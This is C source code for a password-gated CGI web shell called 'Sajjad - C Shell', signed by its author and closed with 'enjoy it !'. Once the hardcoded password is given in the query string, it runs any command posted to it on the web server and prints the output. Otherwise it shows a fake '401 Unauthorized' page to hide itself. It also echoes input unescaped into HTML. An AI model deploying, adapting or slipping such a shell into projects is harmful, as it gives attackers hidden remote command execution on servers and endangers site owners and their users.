#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAXBUFF 1000
#define INPUTNAMESIZE 7
#define DATA_SIZE 2048

#define PASS "password" //password is here !

// gcc sajjad.c -o sajjad.cgi

void urldecode(char *dest, const char *src);

int main()
{
    int i;
    long len;
    char input_decoded[MAXBUFF+1] = {'\0'},
    input[MAXBUFF+1] = {'\0'},
    data[DATA_SIZE];
    FILE *pf;
    printf("content-type: text/html\r\n\r\n");
    if (getenv("QUERY_STRING") && !strcmp(PASS,getenv("QUERY_STRING")))
    {
        printf("<html>\r\n<head>\r\n<title>Sajjad - C Shell</title>\r\n<style>*{background:#ffffff;color:#777777;}</style>\r\n</head>\r\n<body>\r\n");
        if(getenv("CONTENT_LENGTH") != 0)
        {
            sscanf((char *) getenv("CONTENT_LENGTH"),"%ld",&len);
            if (len <= MAXBUFF)
            {
                for(i = 0;i < len;i++)
                    if(i < INPUTNAMESIZE) fgetc(stdin);
                    else input[i-INPUTNAMESIZE] = fgetc(stdin);
                urldecode(input_decoded,input);
                printf("<form action='' method='post'>\r\n"
                       "<input type='text' name='Sajjad' size='50' value='%s'/>\r\n"
                       "<br>\r\n"
                       "<button>go</button>\r\n"
                       "</form><br>\r\n",input_decoded);
                printf("Command: <b style='color:#000000'>%s</b>\r\n<br>\r\n<textarea rows='25' cols='120'>\r\n",input_decoded);
                pf = popen(input_decoded,"r");
                while(fgets(data, DATA_SIZE , pf))
                    fprintf(stdout, "%s",data);
            }
            printf("</textarea>\r\n");
        }else
            printf("<form action='' method='post'>\r\n"
                   "<input type='text' name='Sajjad' size='50'/>\r\n"
                   "<br>\r\n"
                   "<button>go</button>\r\n"
                   "</form>\r\n");
    }
    else
    {
        printf("<html>\r\n<head><title>401 Unauthorized</title></head>\r\n"
               "<body bgcolor='#cc9999' text='#000000' value='Sajjad - C Shell'>\r\n"
               "<H4>401 Unauthorized</H4>\r\n"
               "Authorization required.\r\n");
    }
    printf("</body>\r\n</html>");
    return 0;
}

void urldecode(char *dest, const char *src)
{
    const char *p = src;
    char code[3] = {0};
    unsigned long ascii = 0;
    char *end = NULL;
    while(*p)
        if(*p == '%')
        {
            memcpy(code, ++p, 2);
            ascii = strtoul(code, &end, 16);
            *dest++ = (char)ascii;
            p += 2;
        }
        else if (*p == '+')
        {
            *dest++ = ' ';
            *p++;
        }
        else
            *dest++ = *p++;
}

//enjoy it !
//sajjad@securation.com